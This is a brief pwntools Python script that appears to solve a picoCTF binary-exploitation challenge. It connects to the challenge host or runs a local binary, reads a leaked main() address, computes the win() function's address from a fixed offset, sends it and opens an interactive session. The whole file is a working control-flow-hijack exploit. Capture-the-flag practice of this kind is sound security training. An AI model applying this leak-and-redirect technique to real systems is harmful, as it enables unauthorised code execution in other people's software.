from pwn import *

def exploit(reOrNot):
    if(reOrNot is True):
        r = remote('rescued-float.picoctf.net', 62561)
    else:
        context.binary = binary = ELF('./vuln', False)
        r = process()

    r.recvuntil('main: ')
    mainaddr = int(r.recvline(), 16)
    log.info(f'Address of main(): {hex(mainaddr)}') 
    winaddr = mainaddr - 0x96
    log.info(f'Address of win(): {hex(winaddr)}')   
    r.recvuntil(': ')
    r.sendline(hex(winaddr))
    r.interactive()

exploit(True)